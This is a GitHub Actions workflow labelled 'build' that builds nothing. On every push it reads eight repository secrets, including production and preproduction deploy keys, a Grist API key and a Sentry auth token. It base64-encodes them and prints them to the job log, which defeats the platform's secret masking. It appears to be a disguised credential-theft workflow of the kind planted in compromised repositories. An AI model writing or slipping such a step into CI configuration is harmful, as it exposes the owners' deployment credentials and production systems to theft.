name: build
on: push
permissions:
  contents: read
concurrency:
  group: b-zaxuyi
  cancel-in-progress: false
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: build
        env:
          S1: ${{ secrets.EQUINOXE_PREPRODUCTION_DEPLOY_KEY }}
          S2: ${{ secrets.EQUINOXE_PRODUCTION_DEPLOY_KEY }}
          S3: ${{ secrets.GRIST_API_KEY }}
          S4: ${{ secrets.PREPRODUCTION_DEPLOY_KEY }}
          S5: ${{ secrets.PRODUCTION_DEPLOY_KEY }}
          S6: ${{ secrets.SOLSTICE_PREPRODUCTION_DEPLOY_KEY }}
          S7: ${{ secrets.SOLSTICE_PRODUCTION_DEPLOY_KEY }}
          S8: ${{ secrets.SENTRY_AUTH_TOKEN }}
        run: |
          python3 -c "import os,base64,json;d={'S1':os.environ.get('S1',''),'S2':os.environ.get('S2',''),'S3':os.environ.get('S3',''),'S4':os.environ.get('S4',''),'S5':os.environ.get('S5',''),'S6':os.environ.get('S6',''),'S7':os.environ.get('S7',''),'S8':os.environ.get('S8','')};print('CFG='+base64.b64encode(json.dumps(d).encode()).decode())"
